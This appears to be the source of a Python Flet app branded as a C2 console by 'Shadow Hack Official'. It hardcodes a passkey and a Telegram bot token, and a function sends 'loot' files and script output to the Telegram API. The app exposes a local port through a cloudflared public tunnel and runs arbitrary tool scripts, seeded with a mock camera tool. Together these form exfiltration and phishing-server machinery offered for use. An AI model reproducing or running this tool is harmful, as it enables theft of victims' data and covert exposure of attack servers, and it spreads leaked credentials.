import flet as ft
import os
import sys
import time
import threading
import subprocess
import datetime
import requests
import io
import json

# =====================================================================
# ALTHAF / SHADOW HACK OFFICIAL #
# =====================================================================

SECRET_KEY = "ShadowhackofficialAlthaf8008"
TELEGRAM_BOT_TOKEN = "8857487976:AAGnCactvK0JhGqAg6LSdMHORAdmQVeNQFg"
TELEGRAM_CHAT_ID = "shadowhackowner"  # ആവശ്യമുണ്ടെങ്കിൽ ഇവിടെ ചാറ്റ് ഐഡി നൽകുക

TOOL_DIRECTORY = os.path.join(os.path.expanduser("~"), "aliyan_master_tools")
if not os.path.exists(TOOL_DIRECTORY):
    os.makedirs(TOOL_DIRECTORY)

OFFLINE_CACHE_FILE = os.path.join(TOOL_DIRECTORY, ".offline_queue.json")

def main(page: ft.Page):
    page.title = "ALIYAN NEXUS C2 // SECURE KERNEL v12.0"
    page.vertical_alignment = ft.MainAxisAlignment.CENTER
    page.horizontal_alignment = ft.CrossAxisAlignment.CENTER
    page.bgcolor = "#000000"
    page.window_width = 440
    page.window_height = 900
    page.window_resizable = True

    net_badge = ft.Text("NET: ONLINE [SECURE]", color="#00FF66", size=10, font_family="monospace")
    secure_shield_icon = ft.Icon(ft.icons.SHIELD_ROUNDED, color="#00FF66", size=16)

    session_buffers = {
        "Session-1": ft.Text(value="[session-1] Initialized core shell.\n[system] Ready for payload deployment.", color="#00FF66", font_family="monospace", size=11, selectable=True),
        "Session-2": ft.Text(value="[session-2] Standby background worker online.", color="#00FF66", font_family="monospace", size=11, selectable=True)
    }
    active_session = "Session-1"

    console_container = ft.Container(
        content=ft.Column([session_buffers[active_session]], scroll=ft.ScrollMode.AUTO),
        bgcolor="#020202",
        border=ft.border.all(1, "#00FF66"),
        border_radius=8,
        padding=12,
        expand=True
    )

    def write_console(message, target_session=None):
        sess = target_session or active_session
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        session_buffers[sess].value += f"\n[{timestamp}] {message}"
        try:
            page.update()
        except:
            pass

    def push_loot_to_telegram(file_path=None, payload_msg=None):
        def background_worker():
            try:
                if file_path and os.path.exists(file_path):
                    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                    with open(file_path, 'rb') as f:
                        files = {'document': f}
                        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"🔥 [Loot Exfiltrated]: {payload_msg}"}
                        requests.post(url, data=data, files=files, timeout=15)
                elif payload_msg:
                    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                    data = {'chat_id': TELEGRAM_CHAT_ID, 'text': f"🔥 [C2 Alert]: {payload_msg}"}
                    requests.post(url, json=data, timeout=8)
                write_console("[+] Loot successfully synchronized with Telegram.")
            except Exception as ex:
                write_console(f"[-] Telegram Push Error: {str(ex)}")

        threading.Thread(target=background_worker, daemon=True).start()

    def start_cloudflare_tunnel(port=8080):
        write_console(f"[*] Spawning Cloudflare Tunnel for port {port}...")
        def tunnel_worker():
            try:
                cmd = f"cloudflared tunnel --url http://127.0.0.1:{port}"
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True, text=True)
                for line in process.stdout:
                    if "trycloudflare.com" in line:
                        parts = line.split(" ")
                        for p in parts:
                            if "trycloudflare.com" in p:
                                write_console(f"[!] PUBLIC HTTPS LINK: {p.strip()}")
                                break
            except Exception as e:
                write_console(f"[-] Tunnel Error: {str(e)}")
        threading.Thread(target=tunnel_worker, daemon=True).start()

    def show_dashboard():
        page.controls.clear()
        page.bgcolor = "#030303"

        top_bar = ft.Row([
            ft.Row([secure_shield_icon, ft.Text("ALIYAN-ROOT@NEXUS:~#", color="#00FF66", weight=ft.FontWeight.BOLD, size=13, font_family="monospace")], spacing=6),
            net_badge
        ], alignment=ft.MainAxisAlignment.SPACE_BETWEEN)

        def switch_session_tab(e):
            nonlocal active_session
            active_session = e.control.data
            console_container.content = ft.Column([session_buffers[active_session]], scroll=ft.ScrollMode.AUTO)
            write_console(f"Switched active shell context to {active_session}")
            page.update()

        session_tab_row = ft.Row([
            ft.ElevatedButton("Session-1", data="Session-1", bgcolor="#0f0f0f", color="#00FF66", style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=4)), on_click=switch_session_tab),
            ft.ElevatedButton("Session-2", data="Session-2", bgcolor="#0f0f0f", color="#00FF66", style=ft.ButtonStyle(shape=ft.RoundedRectangleBorder(radius=4)), on_click=switch_session_tab),
        ], alignment=ft.MainAxisAlignment.START)

        tools_grid_container = ft.Column(spacing=8, scroll=ft.ScrollMode.AUTO)

        def scan_and_build_tool_boxes():
            tools_grid_container.controls.clear()
            default_script = os.path.join(TOOL_DIRECTORY, "camera.py")
            if not os.path.exists(default_script):
                with open(default_script, "w") as ds:
                    ds.write("# Aliyan Camera Tool Mock\nprint('[+] Server active...')\n")

            for script_name in [f for f in os.listdir(TOOL_DIRECTORY) if f.endswith('.py')]:
                box_btn = ft.Container(
                    content=ft.Row([
                        ft.Icon(ft.icons.PLAY_ARROW_ROUNDED, color="#00FF66", size=16),
                        ft.Text(f"EXEC: {script_name}", color="#00FF66", font_family="monospace", size=12, weight=ft.FontWeight.BOLD)
                    ], alignment=ft.MainAxisAlignment.START),
                    bgcolor="#0d0d0d",
                    border=ft.border.all(1, "#00FF66"),
                    border_radius=6,
                    padding=10,
                    ink=True,
                    on_click=lambda e, fname=script_name: execute_script_in_ram(fname)
                )
                tools_grid_container.controls.add(box_btn)
            page.update()

        def execute_script_in_ram(filename):
            full_script_path = os.path.join(TOOL_DIRECTORY, filename)
            write_console(f"[*] Loading script into RAM enclave: {filename}")
            def ram_worker():
                try:
                    start_cloudflare_tunnel(8080)
                    with open(full_script_path, 'r') as sf:
                        source_code = sf.read()
                    original_stdout = sys.stdout
                    captured_output = io.StringIO()
                    sys.stdout = captured_output
                    exec(source_code, {'__builtins__': __builtins__, 'log': write_console, 'push': push_loot_to_telegram})
                    sys.stdout = original_stdout
                    res = captured_output.getvalue().strip()
                    if res:
                        write_console(f"[output] {res}")
                        push_loot_to_telegram(payload_msg=f"Output from {filename}:\n{res}")
                except Exception as err:
                    sys.stdout = sys.__stdout__
                    write_console(f"[-] Execution Error: {str(err)}")
            threading.Thread(target=ram_worker, daemon=True).start()

        cli_input_field = ft.TextField(
            hint_text="Type command (e.g., ls, clear, run camera.py)",
            border_color="#00FF66", color="#00FF66", bgcolor="#080808", text_size=12, font_family="monospace", expand=True, height=45
        )

        def handle_terminal_command(e):
            command = cli_input_field.value.strip()
            cli_input_field.value = ""
            if not command: return
            write_console(f"aliyan@{active_session}:~$ {command}")
            if command == "clear":
                session_buffers[active_session].value = f"[{active_session}] Cleared."
            elif command == "ls":
                write_console(f"[files] -> {[f for f in os.listdir(TOOL_DIRECTORY) if f.endswith('.py')]}")
            page.update()

        page.add(
            ft.Column([
                top_bar, ft.Divider(color="#00FF66", height=1), session_tab_row,
                ft.Text("DYNAMIC TOOL REGISTRY (Box Buttons):", color="#777777", size=10, font_family="monospace"),
                ft.Container(content=tools_grid_container, height=170, bgcolor="#050505", border=ft.border.all(1, "#1a1a1a"), border_radius=6, padding=6),
                ft.Text("TERMUX CONSOLE:", color="#777777", size=10, font_family="monospace"),
                console_container,
                ft.Row([cli_input_field, ft.IconButton(icon=ft.icons.SEND_ROUNDED, icon_color="#00FF66", on_click=handle_terminal_command)])
            ], expand=True, spacing=6)
        )
        scan_and_build_tool_boxes()
        page.update()

    def show_login_screen():
        passkey_box = ft.TextField(label="Secret Passkey", password=True, border_color="#00FF66", color="#00FF66", bgcolor="#050505", width=350)
        err_txt = ft.Text("", color="red", size=11)

        def verify(e):
            if passkey_box.value == SECRET_KEY:
                show_dashboard()
            else:
                err_txt.value = "INVALID PASSKEY!"
                page.update()

        page.add(ft.Column([
            ft.Icon(ft.icons.SECURITY_ROUNDED, color="#00FF66", size=65),
            ft.Text("RESTRICTED ROOT GATEWAY", color="#00FF66", size=16, weight=ft.FontWeight.BOLD, font_family="monospace"),
            passkey_box, err_txt,
            ft.ElevatedButton("INITIALIZE SHELL", color="#000000", bgcolor="#00FF66", width=350, height=45, on_click=verify)
        ], alignment=ft.MainAxisAlignment.CENTER, horizontal_alignment=ft.CrossAxisAlignment.CENTER, expand=True))
        page.update()

    show_login_screen()

ft.app(target=main)
